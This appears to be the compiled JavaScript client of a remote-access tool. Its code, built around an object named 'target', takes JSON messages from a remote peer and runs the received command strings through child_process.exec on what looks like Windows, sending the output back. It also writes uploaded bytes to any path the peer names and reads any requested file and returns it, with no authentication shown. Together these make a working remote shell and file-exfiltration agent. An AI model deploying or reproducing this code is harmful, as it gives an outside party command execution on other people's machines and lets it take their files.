"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.getSendData = exports.startDownload = exports.startUpload = void 0;
const targetMain_1 = require("./targetMain");
const child_process_1 = require("child_process");
const fs = __importStar(require("fs"));
const createSendData_1 = require("./createSendData");
let runCmdList = [];
let oneTimeData = [];
exports.startUpload = false;
exports.startDownload = false;
let ulFileName = "";
let ulFileMax = 0;
let ulFilePath = "";
let ulFileNowSize = 0;
let nowConnectionClient = "";
let nowSize = 0;
let dlFilePath = "";
const getSendData = (data) => __awaiter(void 0, void 0, void 0, function* () {
    if (!exports.startUpload && !exports.startDownload) {
        const getData = JSON.parse(data);
        if (getData.type === "sendCmd") {
            console.log(getData.data[0]);
            const cmdList = getData.data[0].split(" ");
            let runCmd = "chcp 65001  &";
            runCmdList.forEach((i, index) => {
                runCmd += `${i} & `;
            });
            runCmd += `${getData.data[0]}`;
            nowConnectionClient = getData.data[1];
            (0, child_process_1.exec)(runCmd, { encoding: 'utf-8' }, (error, stdout, stderr) => {
                if (!error && !stderr) {
                    const sendData = JSON.stringify((0, createSendData_1.createSendData)("cmdResoult", [getData.data[1], stdout]));
                    targetMain_1.target.write(sendData);
                    if (cmdList[0] == "cd") {
                        runCmdList.push(getData.data[0]);
                    }
                }
                else {
                    const sendData = JSON.stringify((0, createSendData_1.createSendData)("cmdResoult", [getData.data[1], stderr]));
                    targetMain_1.target.write(sendData);
                }
            });
        }
        else if (getData.type === "startUpload") {
            let dirList = getData.data[2].split("/");
            let dir = "";
            let deleteFlg = false;
            dirList.forEach((i, index) => {
                if (dirList.length > 2) {
                    if (index != dirList.length - 1 && index != 0) {
                        dir += `/${i}`;
                    }
                    else if (index == 0) {
                        dir += i;
                    }
                }
                else {
                    dir = getData.data[2];
                }
                if (i === '') {
                    console.log("dlete");
                    deleteFlg = true;
                }
            });
            deleteFlg ? dirList = [] : deleteFlg = false;
            console.log(dir);
            console.log(dirList);
            if (dirList.length > 2) {
                if (fs.existsSync(dir)) {
                    exports.startUpload = true;
                    ulFileName = getData.data[0];
                    ulFileMax = getData.data[1];
                    ulFilePath = getData.data[2];
                    nowConnectionClient = getData.data[3];
                    console.log(ulFileMax, ulFileName, ulFilePath, nowConnectionClient);
                    const sendData = JSON.stringify((0, createSendData_1.createSendData)("isUploadFile", [dirList[dirList.length - 1]]));
                    targetMain_1.target.write(sendData);
                }
                else {
                    console.log("だめです");
                    const sendData = JSON.stringify((0, createSendData_1.createSendData)("errorUpload", []));
                    targetMain_1.target.write(sendData);
                }
            }
            else if (dirList.length == 2) {
                exports.startUpload = true;
                ulFileName = getData.data[0];
                ulFileMax = getData.data[1];
                ulFilePath = getData.data[2];
                nowConnectionClient = getData.data[3];
                console.log(ulFileMax, ulFileName, ulFilePath, nowConnectionClient);
                const sendData = JSON.stringify((0, createSendData_1.createSendData)("isUploadFile", [dirList[dirList.length - 1]]));
                targetMain_1.target.write(sendData);
            }
            else {
                console.log("だめです");
                const sendData = JSON.stringify((0, createSendData_1.createSendData)("errorUpload", []));
                targetMain_1.target.write(sendData);
            }
        }
        else if (getData.type === "startDownload") {
            console.log(getData.data[0]);
            exports.startDownload = true;
            dlFilePath = getData.data[0];
            uploadServer(dlFilePath);
        }
    }
    else if (exports.startUpload) {
        console.log("start");
        oneTimeData.push(data);
        const can = Buffer.concat(oneTimeData);
        ulFileNowSize = Buffer.concat(oneTimeData).length;
        console.log(ulFilePath);
        oneTimeData = [];
        yield fs.writeFileSync(`${ulFilePath}`, can, { flag: 'a' });
        console.log("done");
        if (ulFileMax <= fs.statSync(ulFilePath).size) {
            const sendData = JSON.stringify((0, createSendData_1.createSendData)("doneUploadTarget", [nowConnectionClient]));
            targetMain_1.target.write(sendData);
            oneTimeData = [];
            exports.startUpload = false;
            ulFileMax = 0;
            ulFileName = "";
            ulFilePath = "";
            ulFileNowSize = 0;
            nowSize = 0;
        }
    }
});
exports.getSendData = getSendData;
const uploadServer = (path) => {
    try {
        console.log("start server upload");
        const fileSize = fs.statSync(path).size;
        const sendData = JSON.stringify((0, createSendData_1.createSendData)("dlStartFlg", [path, fileSize]));
        targetMain_1.target.write(sendData);
        fs.readFile(dlFilePath, (error, data) => {
            targetMain_1.target.write(data);
        });
        oneTimeData = [];
        exports.startDownload = false;
        ulFileMax = 0;
        ulFileName = "";
        ulFilePath = "";
        ulFileNowSize = 0;
        nowSize = 0;
    }
    catch (error) {
        oneTimeData = [];
        exports.startDownload = false;
        ulFileMax = 0;
        ulFileName = "";
        ulFilePath = "";
        ulFileNowSize = 0;
        nowSize = 0;
        console.log("error");
        const sendData = JSON.stringify((0, createSendData_1.createSendData)("serverUploadError", []));
        targetMain_1.target.write(sendData);
    }
};
